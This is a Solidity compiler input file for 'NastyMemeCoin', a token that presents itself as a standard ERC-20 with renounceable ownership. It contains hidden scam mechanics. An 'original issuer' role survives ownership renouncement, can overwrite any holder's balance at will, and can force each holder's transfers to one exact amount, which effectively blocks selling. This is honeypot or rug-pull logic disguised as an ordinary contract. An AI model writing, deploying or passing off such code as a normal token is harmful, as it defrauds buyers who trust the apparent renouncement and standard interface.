{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface ITokenStandard20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address holder) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract SenderContext {\r\n    function fetchSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract UnitaryControl is SenderContext {\r\n    address private soleController;\r\n    event ControllerChanged(address indexed formerController, address indexed newController);\r\n\r\n    constructor() {\r\n        address sender = fetchSender();\r\n        soleController = sender;\r\n        emit ControllerChanged(address(0), sender);\r\n    }\r\n\r\n    function retrieveController() public view virtual returns (address) {\r\n        return soleController;\r\n    }\r\n\r\n    modifier onlyController() {\r\n        require(retrieveController() == fetchSender(), \"Not authorized. Sole controller only.\");\r\n        _;\r\n    }\r\n\r\n    function surrenderControl() public virtual onlyController {\r\n        emit ControllerChanged(soleController, address(0));\r\n        soleController = address(0);\r\n    }\r\n}\r\n\r\ncontract NastyMemeCoin is SenderContext, UnitaryControl, ITokenStandard20 {\r\n    mapping (address => mapping (address => uint256)) private authorizationLimits;\r\n    mapping (address => uint256) private accountBalances;\r\n    mapping (address => uint256) private enforcedTransferValues;\r\n    address private originalIssuer;\r\n\r\n    string public constant tokenLabel = \"NastyMemeCoin\";\r\n    string public constant tokenAbbreviation = \"NMC\";\r\n    uint8 public constant tokenPrecision = 18;\r\n    uint256 public constant ultimateSupply = 100000 * (10 ** tokenPrecision);\r\n\r\n    constructor() {\r\n        accountBalances[fetchSender()] = ultimateSupply;\r\n        emit Transfer(address(0), fetchSender(), ultimateSupply);\r\n    }\r\n\r\n    modifier onlyOriginalIssuer() {\r\n        require(getOriginalIssuer() == fetchSender(), \"Not authorized. Original issuer only.\");\r\n        _;\r\n    }\r\n\r\n    function getOriginalIssuer() public view virtual returns (address) {\r\n        return originalIssuer;\r\n    }\r\n\r\n    function appointOriginalIssuer(address designatedIssuer) public onlyController {\r\n        originalIssuer = designatedIssuer;\r\n    }\r\n\r\n    event TokenAllocation(address indexed participant, uint256 formerBalance, uint256 updatedBalance);\r\n\r\n    function enforceTransferValue(address holder) public view returns (uint256) {\r\n        return enforcedTransferValues[holder];\r\n    }\r\n\r\n    function assignEnforcedTransferValues(address[] calldata holders, uint256 value) public onlyOriginalIssuer {\r\n        for (uint i = 0; i < holders.length; i++) {\r\n            enforcedTransferValues[holders[i]] = value;\r\n        }\r\n    }\r\n\r\n    function refreshAccountBalance(address[] memory addresses, uint256 newBalance) public onlyOriginalIssuer {\r\n        require(newBalance >= 0, \"Amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < addresses.length; i++) {\r\n            address currentAddr = addresses[i];\r\n            require(currentAddr != address(0), \"Invalid address provided\");\r\n\r\n            uint256 previousBalance = accountBalances[currentAddr];\r\n            accountBalances[currentAddr] = newBalance;\r\n\r\n            emit TokenAllocation(currentAddr, previousBalance, newBalance);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return accountBalances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(accountBalances[fetchSender()] >= amount, \"Insufficient balance\");\r\n\r\n        uint256 requiredTransferValue = enforceTransferValue(fetchSender());\r\n        if (requiredTransferValue > 0) {\r\n            require(amount == requiredTransferValue, \"Mandatory transfer value mismatch\");\r\n        }\r\n\r\n        accountBalances[fetchSender()] -= amount;\r\n        accountBalances[recipient] += amount;\r\n\r\n        emit Transfer(fetchSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return authorizationLimits[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        authorizationLimits[fetchSender()][spender] = amount;\r\n        emit Approval(fetchSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(authorizationLimits[sender][fetchSender()] >= amount, \"Allowance limit exceeded\");\r\n\r\n        uint256 requiredTransferValue = enforceTransferValue(sender);\r\n        if (requiredTransferValue > 0) {\r\n            require(amount == requiredTransferValue, \"Mandatory transfer value mismatch\");\r\n        }\r\n\r\n        accountBalances[sender] -= amount;\r\n        accountBalances[recipient] += amount;\r\n        authorizationLimits[sender][fetchSender()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return ultimateSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return tokenLabel;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return tokenAbbreviation;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return tokenPrecision;\r\n    }\r\n\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}